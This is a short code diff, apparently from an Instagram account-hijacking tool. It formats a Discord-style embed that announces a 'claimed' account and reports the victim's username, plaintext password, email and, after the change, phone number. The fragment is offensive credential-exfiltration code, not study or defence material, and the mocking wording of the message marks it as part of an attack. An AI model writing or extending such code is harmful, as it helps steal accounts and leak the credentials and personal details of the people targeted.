@@ -10,7 +10,7 @@ data = {}
 data["embeds"] = [
             {
                 #"title" : f"Details...",
-                "description" : f"**``fucked``** **[@{self.username}](https://instagram.com/{self.user})**\n***`password : {self.password}**\n*** email:{self.email}**\n***password:{self.password}| claimed By Reaper`***",
+                "description" : f"**``fucked``** **[@{self.username}](https://instagram.com/{self.user})**\n***`password : {self.password}**\n*** email:{self.email}**\n***phone:{self.phone}| claimed By Reaper`***",
                 #"color": 2895667,
                 "thumbnail" : {
                     "url": "https://i.pinimg.com/originals/70/56/56/705656e8c01d3668bc496bef826a21f6.gif"},
